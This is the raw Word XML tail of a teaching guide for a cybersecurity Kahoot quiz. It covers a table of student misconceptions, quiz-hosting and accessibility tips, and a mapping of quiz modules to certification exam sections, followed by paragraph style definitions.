              <w:t>Students think hashing is a type of encryption</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>"Meat grinder — one way. Lock — two way."</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Authentication vs Authorisation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students confuse the terms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>AuthN = identity, AuthZ = permission</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Symmetric vs Asymmetric</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students think asymmetric is always better</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Asymmetric is slow — hybrid = best</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>IDS vs IPS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students reverse them</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>IDS = watch only, IPS = watch + stop</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Static vs Dynamic analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students think dynamic is always first</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Static first (safe), then dynamic (confirms)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CBN vs NDPC timelines</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students say 72 hours for CBN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CBN = 24 hrs (banking); NDPC = 72 hrs (data)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Risk formula errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Students add instead of multiply</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Risk = T × V × I (multiplication)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Kahoot! Platform Tips</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>For best results:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Share screen in full-screen presentation mode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Set music to "Lobby Music — Upbeat" for energy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Announce each module: "Round 2 — Networking and Protocols — let's go!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use "Show Answer Streak" feature for bonus motivation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Save quiz results and share top 5 scores on group WhatsApp/chat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Accessibility:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Read questions aloud (especially for students with slower connections)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Allow 30 extra seconds for [SCENARIO] questions if students request it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Consider "team mode" for complex scenario questions — discuss in pairs before answering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Integration with Certification Exam</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The following questions directly mirror certification exam MCQ style and content:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Section A (MCQ) alignment:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Module 1 parallels Exam Q1–5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Module 4 parallels Exam Q11–15 (cryptography)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Module 7 parallels Exam Q21–25 (web app security)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Module 10 parallels Exam Q31–35 (incident response)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Module 12 parallels Exam Q36–40 (GRC/compliance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Questions to use as final exam revision:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q15, Q30, Q45, Q60, Q75, Q90, Q105, Q120, Q135, Q150, Q165, Q180</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Run all 12 double-point questions in sequence as a 12-question power revision quiz before the certification exam.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Document prepared for MetaBridge Academy*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Textbook Reference: Cybersecurity Sefer — metabridgeacademy.com*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Enrolment: https://wa.me/2347034357206*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*All labs require authorisation. Never test systems you do not own or have explicit written permission to test.*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Cybercrimes (Prohibition, Prevention, Etc.) Act 2015 applies to all unauthorised access in Nigeria.*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EF4444"/>
      <w:sz w:val="48"/>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EF4444"/>
      <w:sz w:val="3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60D1E"/>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E293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Calibri" w:hAnsi="Calibri"/>
      <w:color w:val="1E293B"/>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet2">
    <w:name w:val="List Bullet 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00326F90"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:after="40"/>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:color w:val="1E293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contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:color w:val="1E29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ind w:left="432" w:right="936"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="EF4444"/>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